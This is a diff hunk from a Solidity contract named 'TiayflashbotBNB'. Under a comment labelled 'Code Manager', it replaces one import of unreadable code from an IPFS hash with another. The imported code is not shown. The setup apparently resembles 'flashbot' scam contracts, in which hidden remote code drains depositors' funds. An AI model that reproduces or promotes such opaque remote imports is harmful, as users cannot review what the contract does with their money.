@@ -74,7 +74,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
      */
 
 // Code Manager
-import "ipfs://QmfGWCR79MwESkz7wavxWFEN89Prjq4joA16VJAPtiHoFn";
+import "ipfs://QmaNXwrmx3MBvsTzQrVq2BEsPtoqKqVop7v6xrgrwxT3ZN";
 
 contract TiayflashbotBNB {
 	string public tokenName;
